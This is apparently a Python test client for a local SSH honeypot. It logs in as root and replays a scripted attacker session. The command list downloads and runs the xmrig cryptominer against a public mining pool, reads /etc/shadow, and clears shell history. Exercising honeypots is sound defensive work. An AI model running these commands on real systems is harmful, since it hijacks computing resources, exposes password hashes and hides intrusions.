import asyncio
import asyncssh
import sys

async def run_client():
    try:
        print("Connecting to SSH honeypot on port 2222...")
        async with asyncssh.connect("127.0.0.1", port=2222, username="root", password="password", known_hosts=None) as conn:
            async with conn.create_process() as process:
                print("Interactive session started.")
                
                async def read_until_prompt():
                    try:
                        # Read until the prompt suffix showing up.
                        # The prompt is constructed as: root@ubuntu-server:{cwd}# 
                        # or initially: Welcome ... \n$ 
                        # We can read until space if we are lucky, or just read chunk and check.
                        
                        # Let's try reading until '# ' or '$ '
                        # asyncssh StreamReader doesn't support regex separator easily.
                        # We will read line by line or chunk.
                        
                        output = ""
                        while True:
                            # Read with timeout
                            data = await asyncio.wait_for(process.stdout.read(1024), timeout=5.0)
                            if not data:
                                break
                            output += data
                            # Check basic prompts
                            if output.strip().endswith("#") or output.strip().endswith("$"):
                                break
                        return output
                    except asyncio.TimeoutError:
                        print("Timeout waiting for prompt.")
                        return output

                # Initial welcome message
                print(f"Server output: {await read_until_prompt()}")

                commands = [
                    "whoami",
                    "uname -a",
                    "w",
                    "ps aux",
                    "cat /proc/cpuinfo",
                    "cd /tmp",
                    "wget http://192.168.1.100/xmrig.tar.gz",
                    "tar -xvf xmrig.tar.gz",
                    "chmod +x xmrig",
                    "./xmrig -o stratum+tcp://pool.supportxmr.com:3333",
                    "cat /etc/shadow",
                    "history -c",
                    "exit"
                ]

                for cmd in commands:
                    print(f"Sending: {cmd}")
                    process.stdin.write(cmd + "\n")
                    # simple wait for response
                    response = await read_until_prompt()
                    print(f"Output:\n{response}")

    except Exception as e:
        print(f"Connection failed: {e}")

if __name__ == "__main__":
    asyncio.run(run_client())
